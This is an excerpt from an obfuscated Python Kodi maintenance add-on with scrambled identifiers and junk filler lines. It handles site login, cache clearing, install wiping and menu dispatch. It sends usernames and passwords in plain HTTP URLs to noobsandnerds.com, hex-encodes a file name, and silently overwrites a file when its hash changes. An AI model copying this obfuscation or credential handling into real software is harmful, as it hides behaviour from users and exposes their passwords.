 print "### USER_INFO CHECK"
 if iI1Ii11111iIi == 'true' :
  try :
   OO = 'http://noobsandnerds.com/TI/login/login_details.php?user=%s&pass=%s' % ( Oo , o0O )
   Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
   ooo0O0Oo0O = re . compile ( 'login_msg="(.+?)"' ) . findall ( Ii1iI111II1I1 )
   OooIii1I1iI = ooo0O0Oo0O [ 0 ] if ( len ( ooo0O0Oo0O ) > 0 ) else ''
   oOOooo = re . compile ( 'posts="(.+?)"' ) . findall ( Ii1iI111II1I1 )
   oOO00o0oooOo0 = oOOooo [ 0 ] if ( len ( oOOooo ) > 0 ) else '0'
  except :
   OooIii1I1iI = '[COLOR=lime]UNABLE TO VERIFY LOGIN[/COLOR]'
   if 43 - 43: Oo00oo0oO / o0o + o0oo
 else :
  OooIii1I1iI = '[COLOR=lime]REGISTER FOR FREE TO UNLOCK FEATURES[/COLOR]'
  if 38 - 38: ooo0O0O00
 print "### WELCOMETEXT: " + OooIii1I1iI
 if 59 - 59: o000O0o
 OO = 'http://noobsandnerds.com/TI/menu_check'
 try :
  Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  OoO0OOoO0 = re . compile ( 'd="(.+?)"' ) . findall ( Ii1iI111II1I1 )
  iiI11i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else 'none'
 except :
  iiI11i = 'none'
  if 21 - 21: oOoO0o00OO0 - oooOooOOo0OO * o0oo
 print "### MENU: " + iiI11i
 if 98 - 98: oOoO0o00OO0 - II11iIiIIIiI % IIii1I
 if 54 - 54: oOoO0o00OO0 + O00ooooo00 - o0o * II1
 if not 'REGISTER FOR FREE' in OooIii1I1iI and not 'UNABLE TO VERIFY' in OooIii1I1iI :
  xbmc . log ( "### ATTEMPTING TO WRITE COOKIE " )
  oo0O0 = open ( IIiiiiiiIi1I1 , mode = 'w+' )
  oo0O0 . write ( 'd="' + binascii . hexlify ( Ii1Ii ( ) ) + '"\nl="' + binascii . hexlify ( OooIii1I1iI ) + '"\np="' + binascii . hexlify ( oOO00o0oooOo0 ) + '"\nm="' + binascii . hexlify ( iiI11i ) + '"' )
  oo0O0 . close ( )
  if 71 - 71: o0ii1I + II1 * Ooo00oOo0oOo / OoOo0o
 O0oOO0o ( localbuildcheck , localversioncheck , localidcheck , OooIii1I1iI , iiI11i )
 if 78 - 78: OoOo0o % II11iIiIIIiI
 if 73 - 73: oOoO0o00OO0 + ooo0O0O00 * o000O0o * o0o
def OoOOo0OOoO ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' )
 return
 if 35 - 35: o0o * OOO0O0O0ooooo * o0oo . oOoO0o00OO0
 if 74 - 74: ooo0O0O00 * ooo0O0O00 * o0ii1I / oooOooOOo0OO
def ooI1111 ( ) :
 o0OOOo0 = 1
 try :
  oOOOOoOO0o ( 'http://google.com' , 5 )
 except :
  try :
   oOOOOoOO0o ( 'http://google.com' , 5 )
  except :
   try :
    oOOOOoOO0o ( 'http://google.com' , 5 )
   except :
    try :
     oOOOOoOO0o ( 'http://google.cn' , 5 )
    except :
     try :
      oOOOOoOO0o ( 'http://google.cn' , 5 )
     except :
      i11 . ok ( "NO INTERNET CONNECTION" , 'It looks like this device isn\'t connected to the internet. Only some of the maintenance options will work until you fix the connectivity problem.' )
      O0oOO0o ( '' , '' , '' , '[COLOR=orange]NO INTERNET CONNECTION[/COLOR]' )
      o0OOOo0 = 0
 if o0OOOo0 == 1 :
  o00ooo0O ( )
  if 54 - 54: oOoO0o00OO0 * Oo00oo0oO
  if 3 - 3: Oo00oo0oO - oOoO0o00OO0 * ooo0O0O00 * oOoO0o00OO0 + iiII11i1I1IIi
def o00ooo0O ( ) :
 o0O0ooooooo00 = 'None'
 Oo00O0O = '0'
 if 15 - 15: oOoO0o00OO0 * IIIIiiII111 / ooo0O0O00 . o0ii1I / IIIIiiII111 % Iii
 if 75 - 75: II1 % i11iIiiIii % IIii1I % oOoO0o00OO0 / i11iIiiIii
 IIIIIiI11Ii = open ( o0 , mode = 'r' )
 oOo0O = IIIIIiI11Ii . read ( )
 IIIIIiI11Ii . close ( )
 if 96 - 96: i11Iii * oooOooOOo0OO / IIii1I / o0o
 i1111ii1 = re . compile ( 'date="(.+?)"' ) . findall ( oOo0O )
 IiI1 = i1111ii1 [ 0 ] if ( len ( i1111ii1 ) > 0 ) else ''
 iIiiI1I = re . compile ( 'version="(.+?)"' ) . findall ( oOo0O )
 O0Oo000ooO00 = iIiiI1I [ 0 ] if ( len ( iIiiI1I ) > 0 ) else ''
 if 79 - 79: o0oo + OOO0O0O0ooooo * II11iIiIIIiI
 oo0O = open ( IIIII , mode = 'r' )
 Iii1iI1iiIii = oo0O . read ( )
 oo0O . close ( )
 if 51 - 51: O00ooooo00 - oooOooOOo0OO / oooOooOOo0OO % o0ii1I
 OO000OOOo0Oo = re . compile ( 'id="(.+?)"' ) . findall ( Iii1iI1iiIii )
 oOOoOOO0oOoo = re . compile ( 'name="(.+?)"' ) . findall ( Iii1iI1iiIii )
 Oo00O0O = OO000OOOo0Oo [ 0 ] if ( len ( OO000OOOo0Oo ) > 0 ) else 'None'
 o0O0ooooooo00 = oOOoOOO0oOoo [ 0 ] if ( len ( oOOoOOO0oOoo ) > 0 ) else ''
 if 98 - 98: o0oo * i11Iii + O00ooooo00 + Oo00oo0oO - O00ooooo00 % Iii
 if not os . path . exists ( IIiiiiiiIi1I1 ) :
  xbmc . log ( "### First login check ###" )
  i11I1IiIi ( o0O0ooooooo00 , O0Oo000ooO00 , Oo00O0O )
  if 19 - 19: IIii1I * iiII11i1I1IIi / II11iIiIIIiI
  if 5 - 5: o0ii1I
 else :
  try :
   i1II1Ii = open ( IIiiiiiiIi1I1 , mode = 'r' )
   oOoo0Ooo = i1II1Ii . read ( )
   i1II1Ii . close ( )
   if 100 - 100: oooOooOOo0OO * o0ii1I / ooo0O0O00
   o00o0oooOO0OoO0OOO = re . compile ( 'd="(.+?)"' ) . findall ( oOoo0Ooo )
   OOOoOo000O0oo = re . compile ( 'l="(.+?)"' ) . findall ( oOoo0Ooo )
   OOOoo = re . compile ( 'm="(.+?)"' ) . findall ( oOoo0Ooo )
   iiiii1I1III1 = o00o0oooOO0OoO0OOO [ 0 ] if ( len ( o00o0oooOO0OoO0OOO ) > 0 ) else '0'
   if 97 - 97: o0o
   if iiiii1I1III1 != '0' :
    iiiii1I1III1 = binascii . unhexlify ( iiiii1I1III1 )
    if 84 - 84: Oo00oo0oO - Iii . Oo00oo0oO + i11Iii . ooo0O0O00
   OooIii1I1iI = OOOoOo000O0oo [ 0 ] if ( len ( OOOoOo000O0oo ) > 0 ) else ''
   OooIii1I1iI = binascii . unhexlify ( OooIii1I1iI )
   O00000oooOO = OOOoo [ 0 ] if ( len ( OOOoo ) > 0 ) else ''
   O00000oooOO = binascii . unhexlify ( O00000oooOO )
  except :
   os . remove ( IIiiiiiiIi1I1 )
  if int ( iiiii1I1III1 ) + 2000000 > int ( Ii1Ii ( ) ) :
   xbmc . log ( "### Login successful ###" )
   O0oOO0o ( o0O0ooooooo00 , O0Oo000ooO00 , Oo00O0O , OooIii1I1iI , O00000oooOO )
  else :
   xbmc . log ( "### Checking login ###" )
   i11I1IiIi ( o0O0ooooooo00 , O0Oo000ooO00 , Oo00O0O )
   if 7 - 7: o0oo - i11Iii % O00ooooo00
   if 24 - 24: o0oo % OOO0O0O0ooooo % o0o
def Ii1ooOO0OOO00o ( ) :
 O0oOoooooooOo00O = os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' ) ) )
 if 73 - 73: i11iIiiIii + OOO0O0O0ooooo % OOO0O0O0ooooo
 OoOoO00OoOOo = [
 ( O0oOoooooooOo00O ) ,
 ( oo0o0O00 ) ,
 ( os . path . join ( Oo0o0000o0o0 , 'cache' ) ) ,
 ( os . path . join ( Oo0o0000o0o0 , 'temp' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Localuseraccountnamental' ) ) ,
 ( os . path . join ( oo0o0O00 , 'script.module.simple.downloader' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'script.module.simple.downloader' ) ) ) ) ,
 ( os . path . join ( oo0o0O00 , 'plugin.video.itv' , 'Images' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'plugin.video.itv' , 'Images' ) ) ) ) ]
 if 64 - 64: IIIIiiII111
 for O0oO0 in OoOoO00OoOOo :
  if os . path . exists ( O0oO0 ) and O0oO0 != oo0o0O00 and O0oO0 != O0oOoooooooOo00O :
   for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( O0oO0 ) :
    Ii111IIIIii = 0
    Ii111IIIIii += len ( oO0Ooo0OooOOo )
    if Ii111IIIIii > 0 :
     for Oo0oO00 in oO0Ooo0OooOOo :
      try :
       os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
      except :
       pass
     for OOOOI1iI1i11 in OoIIi1iI :
      try :
       shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
       print "### Successfully cleared " + str ( Ii111IIIIii ) + " files from " + os . path . join ( O0oO0 , OOOOI1iI1i11 )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( O0oO0 , OOOOI1iI1i11 )
  else :
   for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( O0oO0 ) :
    for OOOOI1iI1i11 in OoIIi1iI :
     if 'Cache' in OOOOI1iI1i11 or 'cache' in OOOOI1iI1i11 or 'CACHE' in OOOOI1iI1i11 :
      try :
       shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
       print "### Successfully wiped " + os . path . join ( O0oO0 , OOOOI1iI1i11 )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( O0oO0 , OOOOI1iI1i11 )
       if 55 - 55: o0o - o0o + i11Iii
       if 87 - 87: II1 / Iii . IIii1I / Ooo00oOo0oOo
 try :
  i1Ii1IiiIi1II = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  IiIi1iiII = database . connect ( i1Ii1IiiIi1II )
  ooO0o0o = IiIi1iiII . cursor ( )
  ooO0o0o . execute ( "DROP TABLE IF EXISTS rel_list" )
  ooO0o0o . execute ( "VACUUM" )
  IiIi1iiII . commit ( )
  ooO0o0o . execute ( "DROP TABLE IF EXISTS rel_lib" )
  ooO0o0o . execute ( "VACUUM" )
  IiIi1iiII . commit ( )
 except :
  pass
  if 4 - 4: O00ooooo00 % o0oo * oOoO0o00OO0 . II1
  if 96 - 96: Iii . i11iIiiIii - O00ooooo00 . o000O0o
def OOooOooOOoO0O ( mode ) :
 if zip == '' :
  i11 . ok ( 'Please set your backup location before proceeding' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' )
  I1IiiI . openSettings ( sys . argv [ 0 ] )
  i1I111ii11Iii = I1IiiI . getSetting ( 'zip' )
  if i1I111ii11Iii == '' :
   OOooOooOOoO0O ( mode )
 OoOo0O0O = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' ) )
 if not os . path . exists ( OoOo0O0O ) :
  os . makedirs ( OoOo0O0O )
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if 25 - 25: i11Iii
 if oO000o0Oo00 == 1 :
  if not I11iii1Ii in [ 'skin.confluence' , 'skin.estuary' ] :
   I11iii1Ii = 'skin.confluence' if i1111 < 17 else 'skin.estuary'
   skinSwitch . swapSkins ( I11iii1Ii )
   oo0oO = 0
   xbmc . sleep ( 1000 )
   while not xbmc . getCondVisibility ( "Window.isVisible(yesnodialog)" ) :
    if oo0oO == 150 :
     break
    oo0oO += 1
    xbmc . sleep ( 200 )
    if 83 - 83: IIIIiiII111 / II1 * oooOooOOo0OO . o000O0o . O00ooooo00
   if xbmc . getCondVisibility ( "Window.isVisible(yesnodialog)" ) :
    xbmc . executebuiltin ( 'SetFocus(11)' )
    xbmc . executebuiltin ( 'Action(Select)' )
  if not I11iii1Ii in [ 'skin.confluence' , 'skin.estuary' ] :
   i11 . ok ( "Community Portal" , "Unable to reset skin back to [COLOR yellow]%s[/COLOR]" % I11iii1Ii [ 5 : ] )
   return
  else :
   if 59 - 59: o0o . o0o * o000O0o - IIIIiiII111 % Iii
   oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if oO000o0Oo00 == 0 :
    if not os . path . exists ( OoOo0O0O ) :
     os . makedirs ( OoOo0O0O )
    O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
    if ( not O0O0 ) : return False , 0
    oOIIII = urllib . quote_plus ( O0O0 )
    ooOOo = xbmc . translatePath ( os . path . join ( OoOo0O0O , oOIIII + '.zip' ) )
    i1iii1IiiiI1i1 = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
    IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
    I111iiiii1 = "Creating full backup of existing build"
    OO0ooOoOO0OOo = "Archiving..."
    OooOoooo0000 = ""
    I1ii1i11i = "Please Wait"
    o00Ooo0 ( Oo0o0000o0o0 , ooOOo , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
   IiIIIiI11i1 ( o00OO00OoO )
   oooO ( )
   IIIiiiIi1I1 ( )
   II111iiI1Ii1 ( )
   oo0oO0oO00oO ( o00OO00OoO )
   if os . path . exists ( o0 ) :
    os . remove ( o0 )
   if os . path . exists ( I11II1i ) :
    os . remove ( I11II1i )
   if os . path . exists ( IIIII ) :
    os . remove ( IIIII )
  if mode != 'CB' :
   IiII1 ( )
  try :
   os . remove ( o0 )
  except :
   xbmc . log ( "### Failed to remove startup.xml" )
  try :
   os . remove ( IIIII )
  except :
   xbmc . log ( "### Failed to remove id.xml" )
 else :
  return
  if 10 - 10: o0oo - Ooo00oOo0oOo % o0ii1I - Iii + o0oo
  if 88 - 88: IIii1I % i11Iii + o0ii1I * Iii / o0o . o0oo
def IiIIIiI11i1 ( excludefiles ) :
 I11 . create ( "Wiping Existing Content" , '' , 'Please wait...' , '' )
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( Oo0o0000o0o0 , topdown = True ) :
  OoIIi1iI [ : ] = [ OOOOI1iI1i11 for OOOOI1iI1i11 in OoIIi1iI if OOOOI1iI1i11 not in o00OO00OoO ]
  for OOo0 in oO0Ooo0OooOOo :
   try :
    I11 . update ( 0 , "Removing [COLOR=yellow]" + OOo0 + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( iiiI1IiI , OOo0 ) )
    os . remove ( os . path . join ( iiiI1IiI , OOo0 ) )
    os . rmdir ( os . path . join ( iiiI1IiI , OOo0 ) )
   except :
    xbmc . log ( "Failed to remove file: %s" % OOo0 )
    if 66 - 66: IIii1I * Ooo00oOo0oOo . IIii1I * i11iIiiIii + o0o + IIIIiiII111
    if 94 - 94: O00ooooo00 * o0o - II1 . O00ooooo00 / o0ii1I
def oooO ( ) :
 oooo0Ooo0ooo0 = [ OOo0 for OOo0 in os . listdir ( oOo0oooo00o ) if os . path . isdir ( os . path . join ( oOo0oooo00o , OOo0 ) ) ]
 try :
  for OOo0 in oooo0Ooo0ooo0 :
   try :
    if OOo0 not in o00OO00OoO :
     I11 . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + OOo0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( oOo0oooo00o , OOo0 ) )
   except :
    xbmc . log ( "Failed to remove: %s" % OOo0 )
 except :
  pass
  if 50 - 50: i11iIiiIii . i11iIiiIii * O00ooooo00 / i11iIiiIii . O00ooooo00 - Ooo00oOo0oOo
  if 72 - 72: IIii1I / o0ii1I . oOoO0o00OO0
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( oOo0oooo00o , topdown = True ) :
  OoIIi1iI [ : ] = [ OOOOI1iI1i11 for OOOOI1iI1i11 in OoIIi1iI if OOOOI1iI1i11 not in o00OO00OoO ]
  for OOo0 in oO0Ooo0OooOOo :
   try :
    I11 . update ( 0 , "Removing [COLOR=yellow]" + OOo0 + '[/COLOR]' , '' , 'Please wait...' )
    os . unlink ( os . path . join ( iiiI1IiI , OOo0 ) )
    os . remove ( os . path . join ( iiiI1IiI , OOo0 ) )
   except :
    xbmc . log ( "Failed to remove file: %s" % OOo0 )
    if 78 - 78: IIii1I . i11iIiiIii % Oo00oo0oO * IIIIiiII111 + ooo0O0O00 - IIii1I
    if 50 - 50: oOoO0o00OO0 % IIIIiiII111 - o0o % iiII11i1I1IIi - o0o - o000O0o
def IIIiiiIi1I1 ( keeprepos ) :
 for OOo0 in os . listdir ( i1iiIII111ii ) :
  if not keeprepos :
   if OOo0 not in o00OO00OoO and not 'repo' in OOo0 :
    try :
     I11 . update ( 0 , "Removing Add-on: [COLOR=yellow]" + OOo0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( i1iiIII111ii , OOo0 ) )
    except :
     try :
      os . remove ( os . path . join ( i1iiIII111ii , OOo0 ) )
     except :
      xbmc . log ( "Failed to remove: %s" % OOo0 )
      if 99 - 99: Oo00oo0oO * Iii - O00ooooo00 / OoOo0o . i11Iii % o0ii1I
  else :
   try :
    if OOo0 not in o00OO00OoO :
     I11 . update ( 0 , "Removing Add-on: [COLOR=yellow]" + OOo0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( i1iiIII111ii , OOo0 ) )
   except :
    try :
     os . remove ( os . path . join ( i1iiIII111ii , OOo0 ) )
    except :
     xbmc . log ( "Failed to remove: %s" % OOo0 )
     if 69 - 69: OOO0O0O0ooooo . ooo0O0O00
     if 96 - 96: OOO0O0O0ooooo
def II111iiI1Ii1 ( ) :
 for OOo0 in os . listdir ( oo0o0O00 ) :
  try :
   I11 . update ( 0 , "Removing Add-on Data: [COLOR=yellow]" + OOo0 + ' [/COLOR]' , '' , 'Please wait...' )
   shutil . rmtree ( os . path . join ( oo0o0O00 , OOo0 ) )
  except :
   try :
    os . remove ( os . path . join ( oo0o0O00 , OOo0 ) )
   except :
    xbmc . log ( "Failed to remove: %s" % OOo0 )
    if 89 - 89: oOoO0o00OO0 - iiII11i1I1IIi
    if 26 - 26: i11Iii % i11Iii / Ooo00oOo0oOo / ooo0O0O00
def oo0oO0oO00oO ( excludefiles ) :
 iiIii = [ OOo0 for OOo0 in os . listdir ( Oo0o0000o0o0 ) if os . path . isdir ( os . path . join ( Oo0o0000o0o0 , OOo0 ) ) ]
 try :
  for OOo0 in iiIii :
   try :
    if OOo0 not in excludefiles :
     I11 . update ( 0 , "Cleaning Directory: [COLOR=yellow]" + OOo0 + ' [/COLOR]' , '' , 'Please wait...' )
     shutil . rmtree ( os . path . join ( Oo0o0000o0o0 , OOo0 ) )
   except :
    xbmc . log ( "Failed to remove: %s" % OOo0 )
 except :
  pass
  if 95 - 95: oOoO0o00OO0 / Oo00oo0oO % IIii1I + OOO0O0O0ooooo
  if 6 - 6: Oo00oo0oO
def OOoO0OOO00 ( url ) :
 oOo0I1Ii11i = xbmc . getInfoLabel ( "System.BuildVersion" )
 IIIIIo0ooOoO000oO = float ( oOo0I1Ii11i [ : 4 ] )
 IIIiii1I = Oo0o0000o0o0 . split ( os . sep )
 xbmc . log ( str ( IIIiii1I ) )
 ii1iiii11IiI1 = len ( IIIiii1I )
 O0OoO0ooOoo = IIIiii1I [ ii1iiii11IiI1 - 1 ]
 if O0OoO0ooOoo == '' :
  O0OoO0ooOoo = IIIiii1I [ ii1iiii11IiI1 - 2 ]
 O0OoO0ooOoo = O0OoO0ooOoo . replace ( '.' , '' ) . upper ( )
 i11 . ok ( 'You are running: %s' % O0OoO0ooOoo , "Your version is: %s" % IIIIIo0ooOoO000oO )
 if 43 - 43: OOO0O0O0ooooo
 if 57 - 57: i11iIiiIii + o0o % i11Iii / IIii1I
iiI1ii1 = I11I1i ( )
oO0oo = None
o0o0ooOOo0oO = None
II1IIii1I11I = None
IiiiI1Ii = None
i1I1Iiii = None
I1II = None
OOO0oOoO0O = None
oOOoO0OOoOoO = None
OOo00OoO = None
o00oOOoO0oO = None
OOoOoOO = None
OOo0 = None
ii1IiIIiI11111Ii = None
Ii111iIi1iIi = None
i11iiI1111 = None
ii1111i11ii = None
iiIIi11ii1Ii = None
O0o0O0OO0Oo00OO0oo = None
oOIIII = None
I1iii11 = None
i1i1iIiiI1Ii1 = None
IIIIIo0ooOoO000oO = None
ooO0oOOooOo0 = None
OO0iiiii1iiIIii = None
iIII = None
i11iI1I1I11II = 'maintenance'
if 70 - 70: IIii1I . i11Iii * oooOooOOo0OO
try :
 oO0oo = urllib . unquote_plus ( iiI1ii1 [ "addon_id" ] )
except :
 pass
try :
 oOO00o0O0 = urllib . unquote_plus ( iiI1ii1 [ "adult" ] )
except :
 pass
try :
 o0o0ooOOo0oO = urllib . unquote_plus ( iiI1ii1 [ "artpack" ] )
except :
 pass
try :
 II1IIii1I11I = urllib . unquote_plus ( iiI1ii1 [ "audioaddons" ] )
except :
 pass
try :
 IiiiI1Ii = urllib . unquote_plus ( iiI1ii1 [ "author" ] )
except :
 pass
try :
 i1I1Iiii = urllib . unquote_plus ( iiI1ii1 [ "buildname" ] )
except :
 pass
try :
 I1II = urllib . unquote_plus ( iiI1ii1 [ "data_path" ] )
except :
 pass
try :
 OOO0oOoO0O = urllib . unquote_plus ( iiI1ii1 [ "description" ] )
except :
 pass
try :
 oOOoO0OOoOoO = urllib . unquote_plus ( iiI1ii1 [ "fanart" ] )
except :
 pass
try :
 OOo00OoO = urllib . unquote_plus ( iiI1ii1 [ "forum" ] )
except :
 pass
try :
 iIIii1iiiIiiI = urllib . unquote_plus ( iiI1ii1 [ "guisettingslink" ] )
except :
 pass
try :
 o00oOOoO0oO = urllib . unquote_plus ( iiI1ii1 [ "iconimage" ] )
except :
 pass
try :
 OOoOoOO = str ( iiI1ii1 [ "mode" ] )
except :
 pass
try :
 OOo0 = urllib . unquote_plus ( iiI1ii1 [ "name" ] )
except :
 pass
try :
 O0OOo = urllib . unquote_plus ( iiI1ii1 [ "pictureaddons" ] )
except :
 pass
try :
 ii1IiIIiI11111Ii = urllib . unquote_plus ( iiI1ii1 [ "programaddons" ] )
except :
 pass
try :
 Ii111iIi1iIi = urllib . unquote_plus ( iiI1ii1 [ "provider_name" ] )
except :
 pass
try :
 ii1111i11ii = urllib . unquote_plus ( iiI1ii1 [ "repo_link" ] )
except :
 pass
try :
 i11iiI1111 = urllib . unquote_plus ( iiI1ii1 [ "repo_id" ] )
except :
 pass
try :
 iiIIi11ii1Ii = urllib . unquote_plus ( iiI1ii1 [ "skins" ] )
except :
 pass
try :
 O0o0O0OO0Oo00OO0oo = urllib . unquote_plus ( iiI1ii1 [ "sources" ] )
except :
 pass
try :
 oOIIII = urllib . unquote_plus ( iiI1ii1 [ "title" ] )
except :
 pass
try :
 I1iii11 = urllib . unquote_plus ( iiI1ii1 [ "updated" ] )
except :
 pass
try :
 i1i1iIiiI1Ii1 = urllib . unquote_plus ( iiI1ii1 [ "url" ] )
except :
 pass
try :
 IIIIIo0ooOoO000oO = urllib . unquote_plus ( iiI1ii1 [ "version" ] )
except :
 pass
try :
 ooO0oOOooOo0 = urllib . unquote_plus ( iiI1ii1 [ "video" ] )
except :
 pass
try :
 OO0iiiii1iiIIii = urllib . unquote_plus ( iiI1ii1 [ "videoaddons" ] )
except :
 pass
try :
 iIII = urllib . unquote_plus ( iiI1ii1 [ "zip_link" ] )
except :
 pass
 if 45 - 45: o0oo * Ooo00oOo0oOo * Iii - II11iIiIIIiI % oooOooOOo0OO - iiII11i1I1IIi
if not os . path . exists ( IIIii1II1II ) :
 os . makedirs ( IIIii1II1II )
 if 4 - 4: o0ii1I . Iii - IIii1I / Oo00oo0oO / o000O0o % o000O0o
if not os . path . exists ( o0 ) :
 IIIIIiI11Ii = open ( o0 , mode = 'w+' )
 IIIIIiI11Ii . write ( 'date="01011001"\nversion="0.0"' )
 IIIIIiI11Ii . close ( )
 if 42 - 42: II1 + OOO0O0O0ooooo . o0oo % o0o / iiII11i1I1IIi
if not os . path . exists ( IIIII ) :
 IIIIIiI11Ii = open ( IIIII , mode = 'w+' )
 IIIIIiI11Ii . write ( 'id="None"\nname="None"' )
 IIIIIiI11Ii . close ( )
 if 36 - 36: i11Iii / Ooo00oOo0oOo - ooo0O0O00 / IIIIiiII111
IiIIIi1 = binascii . unhexlify ( '6164646f6e2e786d6c' )
I1111III111ii = xbmc . translatePath ( os . path . join ( i1iiIII111ii , OO0o , IiIIIi1 ) )
i1I111Ii1I = open ( I1111III111ii , mode = 'r' )
oOo0O = file . read ( i1I111Ii1I )
file . close ( i1I111Ii1I )
oo000oo0oOo0 = re . compile ( '<ref>(.+?)</ref>' ) . findall ( oOo0O )
IIiO0 = oo000oo0oOo0 [ 0 ] if ( len ( oo000oo0oOo0 ) > 0 ) else ''
i1I1ii1iI1 = hashlib . md5 ( open ( O000OO0 , 'rb' ) . read ( ) ) . hexdigest ( )
if IIiO0 != i1I1ii1iI1 :
 o0o0O0O00oOOo = open ( O0OoO000O0OO , mode = 'r' )
 oOo0O = file . read ( o0o0O0O00oOOo )
 file . close ( o0o0O0O00oOOo )
 oo0O0 = open ( O000OO0 , mode = 'w+' )
 oo0O0 . write ( oOo0O )
 oo0O0 . close ( )
 if 63 - 63: OOO0O0O0ooooo . OoOo0o / OoOo0o / IIii1I + II11iIiIIIiI . o0o
if OOoOoOO == None : o00ooo0O ( )
elif OOoOoOO == 'ASCII_Check' : Iio00 ( )
elif OOoOoOO == 'addon_final_menu' : oOoO00O0 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'addon_categories' : OooOo0ooo ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'addon_countries' : IiII111i1i11 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'addon_genres' : Oo00OOo00O ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'addon_install' : OooOOOo0 ( OOo0 , iIII , ii1111i11ii , i11iiI1111 , oO0oo , Ii111iIi1iIi , OOo00OoO , I1II )
elif OOoOoOO == 'addon_install_zero' : ooOOOOo0 ( OOo0 , iIII , ii1111i11ii , i11iiI1111 , oO0oo , Ii111iIi1iIi , OOo00OoO , I1II )
elif OOoOoOO == 'addon_loop' : ooo000oOO ( )
elif OOoOoOO == 'addon_removal_menu' : ooOOOo ( )
elif OOoOoOO == 'addonmenu' : IiIiIi1I1 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'addon_settings' : I11oOOooo ( )
elif OOoOoOO == 'adult_filter' : I1III1II1I11 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'app_installer' : installapps . INDEX1 ( )
elif OOoOoOO == 'backup' : BACKUP ( )
elif OOoOoOO == 'backup_option' : i1i ( )
elif OOoOoOO == 'backup_restore' : IiiIIi1 ( )
elif OOoOoOO == 'browse_repos' : ooO00o ( )
elif OOoOoOO == 'CB_Menu' : oOOoO0O ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'check_storage' : checkPath . check ( i11iI1I1I11II )
elif OOoOoOO == 'check_updates' : I11ii1IIiIi ( )
elif OOoOoOO == 'clear_cache' : O0OoOOooO0O ( )
elif OOoOoOO == 'create_keyword' : iio00O0o00oo ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'community_backup' : OOOOO000oo0 ( )
elif OOoOoOO == 'community_backup_2' : I1IIIi1i ( )
elif OOoOoOO == 'community_menu' : O0OOOOOO0ooO ( i1i1iIiiI1Ii1 , ooO0oOOooOo0 )
elif OOoOoOO == 'countries' : II11II1I ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'description' : o00o0 ( OOo0 , i1i1iIiiI1Ii1 , i1I1Iiii , IiiiI1Ii , IIIIIo0ooOoO000oO , OOO0oOoO0O , I1iii11 , iiIIi11ii1Ii , OO0iiiii1iiIIii , II1IIii1I11I , ii1IiIIiI11111Ii , O0OOo , O0o0O0OO0Oo00OO0oo , oOO00o0O0 )
elif OOoOoOO == 'delete_path' : OOoOoO ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'delete_profile' : iiIIiI1 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'enableaddons' : i1iiiiii1 ( )
elif OOoOoOO == 'fix_special' : OooO00oo0O0 ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'full_backup' : IiiiI11 ( )
elif OOoOoOO == 'full_clean' : i11ii ( )
elif OOoOoOO == 'genres' : oooO0ooo ( i1i1iIiiI1Ii1 )
elif OOoOoOO == 'gotham' : IIi1I1iIIiiII11i1I1 ( )
